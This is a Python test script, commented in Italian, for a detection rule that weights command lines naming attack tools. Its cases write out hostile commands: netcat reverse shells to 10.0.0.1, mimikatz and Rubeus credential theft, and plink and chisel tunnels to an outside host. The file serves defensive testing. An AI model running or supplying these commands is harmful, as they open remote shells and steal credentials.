# -*- coding: utf-8 -*-
# SPDX-License-Identifier: Apache-2.0
# Gli strumenti d'attacco e a doppio uso nominati tra gli argomenti di un comando o in una riga
# scritta in console (tc_regole.strumento_nominato).
import tc_regole as R
# (testo, dal_principio, peso atteso)
casi = [
 (u'.\\Rubeus.exe kerberoast /outfile:h.txt', True, 3),
 (u'& "C:\\Tools\\mimikatz\\x64\\mimikatz.exe" privilege::debug', True, 3),
 (u'cd C:\\Tools\\SharpHound', True, 3),
 (u'Import-Module .\\PowerView.ps1', True, 3),
 (u'nc -lvp 4444', True, 2),
 (u'nc.exe -e cmd.exe 10.0.0.1 443', True, 2),
 (u'plink -R 3389:127.0.0.1:3389 root@1.2.3.4', True, 2),
 (u'chisel client 1.2.3.4:8080 R:socks', True, 3),
 (u'nxc smb 10.0.0.0/24 -u a -p b', True, 3),
 (u'.\\beacon.exe', True, 3),
 (u'Get-Service beacon', True, 0),
 (u'ping -c 4 tor', True, 0),
 (u'Get-Process | Select-String artifact', True, 0),
 (u'netsh nps export filename="c:\\nps.xml" exportPSK=YES', True, 0),
 (u'git clone https://github.com/user/responder-theme', True, 0),
 (u'dotnet build -c Release', True, 0),
 (u'docker run -it tor', True, 0),
 (u'echo nc', True, 0),
 (u'/c nc -e cmd.exe 10.0.0.1 443', False, 2),
 (u'/c start /b nc -e cmd.exe 10.0.0.1 443', False, 2),
 (u'/c "C:\\Program Files\\Tor\\tor.exe" -f torrc', False, 2),
 (u'/c dir C:\\Users\\tor\\Documents', False, 0),
 (u'/c copy report.doc \\\\nc\\share', False, 0),
 (u'/c "C:\\Program Files\\Editor\\editor.exe" --beacon', False, 0),
 (u'-c "Get-ChildItem C:\\inetpub\\artifact"', False, 0),
 (u'/c psexec \\\\srv -s cmd', False, 2),
 (u'-File C:\\Scripts\\Inventory.ps1 -Tool nmap', False, 2),
 (u'/c winget install rclone', False, 2),
 (u'/c "C:\\Program Files\\GarminMapInstall\\x.exe"', False, 0),
 (u'-NoProfile -File "C:\\Program Files\\SecureFilesDelete\\run.ps1"', False, 0),
 (u'/c sc query PowerViewer', False, 0),
 (u'/c hashdump.exe', False, 3),
 (u'', False, 0),
 (None, False, 0),
 (u'/c "&&&&||;;;"', False, 0),
]
sb = 0
for testo, dal, atteso in casi:
    peso, cosa = R.strumento_nominato(testo, dal)
    if peso != atteso:
        sb += 1
    print ('ok ' if peso == atteso else 'NO '), peso, repr(testo)[:70], '|', cosa.encode('utf-8')
print 'sbagliati', sb
